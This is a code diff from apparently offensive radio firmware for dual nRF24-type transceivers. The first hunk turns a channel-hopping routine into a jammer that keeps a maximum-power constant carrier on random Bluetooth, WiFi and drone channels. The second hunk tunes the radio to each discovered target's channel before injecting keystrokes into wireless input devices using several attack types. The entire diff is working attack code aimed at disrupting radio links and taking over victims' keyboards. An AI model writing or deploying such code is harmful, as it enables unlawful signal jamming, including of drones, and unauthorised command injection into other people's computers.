@@ -291,12 +291,14 @@ inline void singleChannel() {
     for(int i = 0; i < 10; i++) {
         if (AtomicUtils::safe_load(radio1_ok) && AtomicUtils::safe_load(radio2_ok)) {
             // Radio 1 focuses on BT, Radio 2 on WiFi/Drone
-            radio.setChannel(random(BT_CH_START, BT_CH_END));
-            if (random(0, 2) == 0) {
-                radio2.setChannel(wifi_ch[random(0, sizeof(wifi_ch) / sizeof(wifi_ch[0]))]);
-            } else {
-                radio2.setChannel(random(DRONE_CH_START, DRONE_CH_END + 1));
-            }
+            byte ch1 = random(BT_CH_START, BT_CH_END);
+            byte ch2 = (random(0, 2) == 0) ? wifi_ch[random(0, sizeof(wifi_ch) / sizeof(wifi_ch[0]))] : random(DRONE_CH_START, DRONE_CH_END + 1);
+            radio.stopConstCarrier();
+            radio2.stopConstCarrier();
+            radio.setChannel(ch1);
+            radio2.setChannel(ch2);
+            radio.startConstCarrier(RF24_PA_MAX, ch1);
+            radio2.startConstCarrier(RF24_PA_MAX, ch2);
         } else {
             int r = random(0, 3);
             byte ch;
@@ -304,8 +306,16 @@ inline void singleChannel() {
             else if (r == 1) ch = wifi_ch[random(0, sizeof(wifi_ch) / sizeof(wifi_ch[0]))];
             else ch = random(DRONE_CH_START, DRONE_CH_END + 1);
             
-            if (AtomicUtils::safe_load(radio1_ok)) radio.setChannel(ch);
-            if (AtomicUtils::safe_load(radio2_ok)) radio2.setChannel(ch);
+            if (AtomicUtils::safe_load(radio1_ok)) {
+                radio.stopConstCarrier();
+                radio.setChannel(ch);
+                radio.startConstCarrier(RF24_PA_MAX, ch);
+            }
+            if (AtomicUtils::safe_load(radio2_ok)) {
+                radio2.stopConstCarrier();
+                radio2.setChannel(ch);
+                radio2.startConstCarrier(RF24_PA_MAX, ch);
+            }
         }
         delayMicroseconds(130);
     }
@@ -408,6 +418,9 @@ inline void injectKeystroke(uint8_t modifier, uint8_t key, int type, uint8_t* ta
 inline void universalInject(uint8_t modifier, uint8_t key) {
     int count = AtomicUtils::safe_load(mjTargetCount);
     for(int i = 0; i < count; i++) {
+        if (AtomicUtils::safe_load(radio1_ok)) {
+            radio.setChannel(mjTargetChannels[i]);
+        }
         // Try all attack types on discovered targets
         for(int type = 0; type < 3; type++) {
             injectKeystroke(modifier, key, type, mjTargetAddresses[i]);
